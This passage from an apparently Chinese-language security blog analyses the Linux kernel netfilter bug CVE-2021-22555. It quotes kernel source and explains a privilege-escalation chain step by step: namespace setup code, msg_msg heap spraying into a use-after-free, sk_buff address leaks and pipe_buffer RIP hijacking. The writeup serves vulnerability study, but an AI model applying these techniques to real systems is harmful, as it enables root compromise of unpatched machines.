class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in),<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_setsockopt = compat_ip_setsockopt,<br>.compat_getsockopt = compat_ip_getsockopt,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.mtu_reduced   = tcp_v4_mtu_reduced,<br>&#125;;<br></code></pre></td></tr></table></figure><p>由于我们开启了 Netfilter，所以在 <code>compat_ip_setsockopt()</code> 最后会调用到 <code>compat_nf_setsockopt</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">compat_ip_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params"> <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER</span><br><span class="hljs-comment">/* we need to exclude all possible ENOPROTOOPTs except default case */</span><br><span class="hljs-keyword">if</span> (err == -ENOPROTOOPT &amp;&amp; optname != IP_HDRINCL &amp;&amp;<br>optname != IP_IPSEC_POLICY &amp;&amp;<br>optname != IP_XFRM_POLICY &amp;&amp;<br>!ip_mroute_opt(optname))<br>err = compat_nf_setsockopt(sk, PF_INET, optname, optval,<br>   optlen);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> err;<br>&#125;<br>EXPORT_SYMBOL(compat_ip_setsockopt);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>这个函数和 <code>compat_nf_getsockopt()</code> 一样都是 <code>compat_nf_sockopt()</code> 的 wrapper，在该函数中会使用 找到对应的函数表，根据对应操作调用对应函数，我们是 32 位进程的系统调用，所以应该走入 <code>compat_set</code>这一指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compat_nf_sockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf, <span class="hljs-type">int</span> val,</span><br><span class="hljs-params">     <span class="hljs-type">char</span> __user *opt, <span class="hljs-type">int</span> *len, <span class="hljs-type">int</span> get)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">int</span> ret;<br><br>ops = nf_sockopt_find(sk, pf, val, get);<br><span class="hljs-keyword">if</span> (IS_ERR(ops))<br><span class="hljs-keyword">return</span> PTR_ERR(ops);<br><br><span class="hljs-keyword">if</span> (get) &#123;<br><span class="hljs-keyword">if</span> (ops-&gt;compat_get)<br>ret = ops-&gt;compat_get(sk, val, opt, len);<br><span class="hljs-keyword">else</span><br>ret = ops-&gt;get(sk, val, opt, len);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (ops-&gt;compat_set)<br>ret = ops-&gt;compat_set(sk, val, opt, *len);<br><span class="hljs-keyword">else</span><br>ret = ops-&gt;<span class="hljs-built_in">set</span>(sk, val, opt, *len);<br>&#125;<br><br>module_put(ops-&gt;owner);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么具体调用到哪个函数？在 <code>nf_sockopt_find</code> 中使用内核双向链表遍历宏遍历全局变量<code>nf_sockopts</code>，判断条件是函数表的 pf 等于我们在上层传入的 pf（在 <code>compat_ip_setsockopt</code> 中传入的为 <code>PF_INET</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> nf_sockopt_ops *<span class="hljs-title function_">nf_sockopt_find</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf,</span><br><span class="hljs-params"><span class="hljs-type">int</span> val, <span class="hljs-type">int</span> get)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> *<span class="hljs-title">ops</span>;</span><br><br>mutex_lock(&amp;nf_sockopt_mutex);<br>list_for_each_entry(ops, &amp;nf_sockopts, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (ops-&gt;pf == pf) &#123;<br><span class="hljs-keyword">if</span> (!try_module_get(ops-&gt;owner))<br><span class="hljs-keyword">goto</span> out_nosup;<br><br><span class="hljs-keyword">if</span> (get) &#123;<br><span class="hljs-keyword">if</span> (val &gt;= ops-&gt;get_optmin &amp;&amp;<br>val &lt; ops-&gt;get_optmax)<br><span class="hljs-keyword">goto</span> out;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (val &gt;= ops-&gt;set_optmin &amp;&amp;<br>val &lt; ops-&gt;set_optmax)<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>module_put(ops-&gt;owner);<br>&#125;<br>&#125;<br>out_nosup:<br>ops = ERR_PTR(-ENOPROTOOPT);<br>out:<br>mutex_unlock(&amp;nf_sockopt_mutex);<br><span class="hljs-keyword">return</span> ops;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>在 iptables 模块的初始化函数中注册了函数表</strong> <code>ipt_sockopts</code>，<code>nf_register_sockopt()</code> 用以在 <code>nf_sockopts</code> 链表中插入节点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">ip_tables_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* Register setsockopt */</span><br>ret = nf_register_sockopt(&amp;ipt_sockopts);<br></code></pre></td></tr></table></figure><p>那么一切就清楚了，对于 setsockopt 系统调用，我们最终调用的应该是 <code>compat_do_ipt_set_ctl</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> <span class="hljs-title">ipt_sockopts</span> =</span> &#123;<br>.pf= PF_INET,<br>.set_optmin= IPT_BASE_CTL,<br>.set_optmax= IPT_SO_SET_MAX+<span class="hljs-number">1</span>,<br>.<span class="hljs-built_in">set</span>= do_ipt_set_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_set= compat_do_ipt_set_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.get_optmin= IPT_BASE_CTL,<br>.get_optmax= IPT_SO_GET_MAX+<span class="hljs-number">1</span>,<br>.get= do_ipt_get_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_get= compat_do_ipt_get_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><p>前面讲到 32 位程序的 setsockopt 系统调用最终会调用到 <code>compat_do_ipt_set_ctl()</code>，而漏洞便发生在当我们指定 optname 为 <code>IPT_SO_SET_REPLACE</code> 时，其最终会调用 <code>compat_do_replace()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">compat_do_ipt_set_ctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk,<span class="hljs-type">int</span> cmd, <span class="hljs-type">void</span> __user *user,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (!ns_capable(sock_net(sk)-&gt;user_ns, CAP_NET_ADMIN))<br><span class="hljs-keyword">return</span> -EPERM;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> IPT_SO_SET_REPLACE:<br>ret = compat_do_replace(sock_net(sk), user, len);<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> IPT_SO_SET_ADD_COUNTERS:<br>ret = do_add_counters(sock_net(sk), user, len, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">default</span>:<br>ret = -EINVAL;<br>&#125;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">compat_do_ipt_set_ctl()<br>    compat_do_replace()<br>    translate_compat_table()<br>    compat_copy_entry_from_user()<br>    xt_compat_match_from_user()<br>    xt_compat_target_from_user()<br></code></pre></td></tr></table></figure><p>这里提前说明：<strong>漏洞在</strong> <code>xt_compat_match_from_user()</code> <strong>与</strong> <code>xt_compat_target_from_user()</code> <strong>中都存在，逻辑相同</strong></p><p>我们先来看 <code>xt_compat_target_from_user()</code>，在这里会将 <code>t-&gt;data + target-&gt;targetsize</code> 起始的长度为 <code>pad</code> 的区域置 0：先将 targetsize 向上与 8 对齐，之后再减去 targetsize，剩下的这段自然就是分配的 object 减去 targetsize 后的剩余空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">xt_compat_target_from_user</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> xt_entry_target *t, <span class="hljs-type">void</span> **dstptr,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *size)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_target</span> *<span class="hljs-title">target</span> =</span> t-&gt;u.kernel.target;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">compat_xt_entry_target</span> *<span class="hljs-title">ct</span> =</span> (<span class="hljs-keyword">struct</span> compat_xt_entry_target *)t;<br><span class="hljs-type">int</span> pad, off = xt_compat_target_offset(target);<br><span class="hljs-type">u_int16_t</span> tsize = ct-&gt;u.user.target_size;<br><span class="hljs-type">char</span> name[<span class="hljs-keyword">sizeof</span>(t-&gt;u.user.name)];<br><br>t = *dstptr;<br><span class="hljs-built_in">memcpy</span>(t, ct, <span class="hljs-keyword">sizeof</span>(*ct));<br><span class="hljs-keyword">if</span> (target-&gt;compat_from_user)<br>target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">memcpy</span>(t-&gt;data, ct-&gt;data, tsize - <span class="hljs-keyword">sizeof</span>(*ct));<br>pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;<br><span class="hljs-keyword">if</span> (pad &gt; <span class="hljs-number">0</span>)<br><span class="hljs-built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="hljs-number">0</span>, pad);<span class="hljs-comment">// 漏洞产生点</span><br><br>tsize += off;<br>t-&gt;u.user.target_size = tsize;<br>strlcpy(name, target-&gt;name, <span class="hljs-keyword">sizeof</span>(name));<br>module_put(target-&gt;me);<br><span class="hljs-built_in">strncpy</span>(t-&gt;u.user.name, name, <span class="hljs-keyword">sizeof</span>(t-&gt;u.user.name));<br><br>*size += off;<br>*dstptr += tsize;<br>&#125;<br>EXPORT_SYMBOL_GPL(xt_compat_target_from_user);<br></code></pre></td></tr></table></figure><p>理想情况下，应该是按照如下方式进行清零的，看起来好像没有什么问题？（下图例子中假设 targetsize 小于 8）</p><p><img src="https://s2.loli.net/2022/03/31/3jlPfpg2AMYoZrv.png" alt="image.png"></p><p><strong>但是 t-&gt;data 并不一定是 8 字节对齐的，而我们计算 pad 时却默认 t-&gt;data 应当 8 字节对齐</strong>，因此若 t-&gt;data 并非 8 字节对齐，而 pad 计算时向上与 8  字节对齐，<strong>就会导致越界写入数字节的 0 到相邻的下一个 object 中</strong></p><p><img src="https://s2.loli.net/2022/03/31/eS15WvRZuz8f6HU.png" alt="image.png"></p><p>这里笔者对公开的 exp 进行调试，可以看到的是 t-&gt;data <strong>确乎可以为一个非 8 字节对齐的地址，而此时 target-&gt;targetsize 再向上对 8 字节对齐，自然就会越界写到相邻下一 object 的开头</strong></p><p><img src="https://s2.loli.net/2022/03/31/NBqKxZEDsOmgc64.png" alt="image.png"></p><p>在 <code>xt_compat_match_from_user()</code> 中产生的漏洞逻辑相同，这里就不赘叙了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">xt_compat_match_from_user</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> xt_entry_match *m, <span class="hljs-type">void</span> **dstptr,</span><br><span class="hljs-params">       <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *size)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_match</span> *<span class="hljs-title">match</span> =</span> m-&gt;u.kernel.match;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">compat_xt_entry_match</span> *<span class="hljs-title">cm</span> =</span> (<span class="hljs-keyword">struct</span> compat_xt_entry_match *)m;<br><span class="hljs-type">int</span> pad, off = xt_compat_match_offset(match);<br><span class="hljs-type">u_int16_t</span> msize = cm-&gt;u.user.match_size;<br><span class="hljs-type">char</span> name[<span class="hljs-keyword">sizeof</span>(m-&gt;u.user.name)];<br><br>m = *dstptr;<br><span class="hljs-built_in">memcpy</span>(m, cm, <span class="hljs-keyword">sizeof</span>(*cm));<br><span class="hljs-keyword">if</span> (match-&gt;compat_from_user)<br>match-&gt;compat_from_user(m-&gt;data, cm-&gt;data);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">memcpy</span>(m-&gt;data, cm-&gt;data, msize - <span class="hljs-keyword">sizeof</span>(*cm));<br>pad = XT_ALIGN(match-&gt;matchsize) - match-&gt;matchsize;<br><span class="hljs-keyword">if</span> (pad &gt; <span class="hljs-number">0</span>)<br><span class="hljs-built_in">memset</span>(m-&gt;data + match-&gt;matchsize, <span class="hljs-number">0</span>, pad); <span class="hljs-comment">// 漏洞产生点</span><br><br>msize += off;<br>m-&gt;u.user.match_size = msize;<br>strlcpy(name, match-&gt;name, <span class="hljs-keyword">sizeof</span>(name));<br>module_put(match-&gt;me);<br><span class="hljs-built_in">strncpy</span>(m-&gt;u.user.name, name, <span class="hljs-keyword">sizeof</span>(m-&gt;u.user.name));<br><br>*size += off;<br>*dstptr += msize;<br>&#125;<br>EXPORT_SYMBOL_GPL(xt_compat_match_from_user);<br></code></pre></td></tr></table></figure><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>接下来我们来考虑如何利用这个越界写 0 的漏洞，现在公开的这一份 exp 利用 <code>msg_msg</code> 构造 UAF、利用 <code>sk_buff</code> 写入 object、利用 <code>pipe_buffer</code> 劫持 RIP，笔者认为这是一个很好的思路，所以后面笔者构造 exp 也会遵循同样的思路完成</p><blockquote><p>下面的图例大部分来自 <a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">Google 的 security research 博客</a>，非常感谢 Google 做出了如此简单易懂的图例！</p></blockquote><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Step-O-开始前的准备工作"><a href="#Step-O-开始前的准备工作" class="headerlink" title="Step.O 开始前的准备工作"></a>Step.O 开始前的准备工作</h3><p>为了触发到漏洞的路径，我们应当使用 <code>unshare()</code> 隔离出对应的的命名空间，同时为了提高堆喷的稳定性，我们将进程绑定到固定核心上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>)<br>    errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);<br><span class="hljs-keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="hljs-number">0</span>)<br>    errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);<br><br>CPU_ZERO(&amp;cpu_set);<br>CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br></code></pre></td></tr></table></figure><blockquote><p>如果不隔离出独立命名空间的话<strong>便不会走到触发漏洞的路径</strong>，因为我们需要 <code>CAP_SYS_ADMIN</code> 权限，作为普通用户只能通过命名空间隔离进行获取</p></blockquote><h3 id="Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息"><a href="#Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息" class="headerlink" title="Step.I 堆喷 msg_msg ，建立主从消息队列，构造重叠辅助消息"></a>Step.I 堆喷 <code>msg_msg</code> ，建立主从消息队列，构造重叠辅助消息</h3><p>现在我们有了一个堆上 off-by-one，我们该怎么利用呢？比较朴素的一种思想便是覆写一个头部为指针的结构体，利用 partial overwrite 使得两个这样的结构体的头部指针指向同一个结构体，<strong>从而实现 object overlapping</strong></p><p>那么选用什么样的结构体作为 victim 呢？这里我们选择使用 <code>msg_msg</code> 这一结构体，其长度可控，且开头正好是内核双向链表结构体，我们所能覆写的为其 next 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们在一个消息队列上发送多个消息时，会形成如下结构：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难想到的是，我们可以在一开始时先创建多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为 0x1000，第二条消息（辅助消息）的大小为 0x400：</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>之后我们读出其中几个消息队列的主消息，再利用 setsockopt 获取到我们刚释放的 <code>msg_msg</code> 结构体的空间</p><p><img src="https://s2.loli.net/2022/03/31/cJjVS59m8nvI4e2.png" alt="image.png"></p><p>这样就会导致 <code>xt_table_info</code> 结构体覆写到其相邻的主消息的 next 指针，从而导致<strong>在两个消息队列上存在两个主消息指向同一个辅助消息</strong></p><p><img src="https://s2.loli.net/2022/03/31/vOMedQBuFsiKlYD.png" alt="image.png"></p><p>我们可以通过在主从消息中放置对应的值来标识喷射的不同的消息队列，遍历读取所有队列来感知指向了同一辅助消息的两个队列</p><blockquote><p>利用 <code>MSG_COPY</code> 标志位可以读取消息队列上的消息而不释放，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-II-释放辅助消息，构造-UAF"><a href="#Step-II-释放辅助消息，构造-UAF" class="headerlink" title="Step.II 释放辅助消息，构造 UAF"></a>Step.II 释放辅助消息，构造 UAF</h3><p>此时我们将辅助消息释放掉，便能成功完成 UAF 的构建，此时<strong>我们仍能通过其中一个消息队列访问到该辅助消息对应 object，但实际上这个 object 已经在 freelist 上了</strong></p><p><img src="https://s2.loli.net/2022/03/31/nbw6aSFXIVEtDN4.png" alt="image.png"></p><h3 id="Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址"><a href="#Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址" class="headerlink" title="Step.III 堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址"></a>Step.III 堆喷 <code>sk_buff</code> 伪造辅助消息，泄露 UAF obj 地址</h3><p>接下来我们考虑如何利用这个 UAF，因为其仍位于消息队列上所以我们考虑伪造 <code>msg_msg</code> 结构体进行后续的利用，这里我们选用另外一个常用来进行堆喷的结构体——<code>sk_buff</code>，类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，<strong>用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>至于这个结构体的分配与释放也是十分简单，<strong>sk_buff 在内核网络协议栈中代表一个「包」，</strong>我们不难想到的是<strong>我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong>，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</p><p>接下来我们考虑如何通过伪造 <code>msg_msg</code> 结构体完成信息泄露，我们不难想到的是可以伪造一个 <code>msg_msg</code> 结构体，将其 <code>m_ts</code> 域设为一个较大值，<strong>从而越界读取到相邻辅助消息的 header，泄露出堆上地址</strong></p><p><img src="https://s2.loli.net/2022/03/31/CxE24knZqyXPgHj.png" alt="image.png"></p><p>我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 <code>msg_queue</code> 结构，这是目前我们已知的两个“堆上地址”</p><p>接下来我们伪造 <code>msg_msg-&gt;next</code>，<strong>将其指向我们的 UAF object 相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址</strong>，有了这个辅助消息的地址，再减去 0x400 <strong>便是我们的 UAF 对象的地址</strong></p><blockquote><p>通过伪造 msg_msg-&gt;next 可以完成任意地址读，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-IV-堆喷-pipe-buffer，泄露内核基址"><a href="#Step-IV-堆喷-pipe-buffer，泄露内核基址" class="headerlink" title="Step.IV 堆喷 pipe_buffer，泄露内核基址"></a>Step.IV 堆喷 <code>pipe_buffer</code>，泄露内核基址</h3><p>现在我们已知了可控区域的地址，接下来让我们来考虑泄露内核 .text 段的基址，以及如何劫持 RIP 完成提权</p><p>之前我们为什么将辅助消息的大小设为 0x400？除了方便对齐以外，还有一层考虑就是这个大小刚好有一个十分实用的结构体 <code>pipe_buffer</code> 数组，<strong>既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP</strong></p><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span 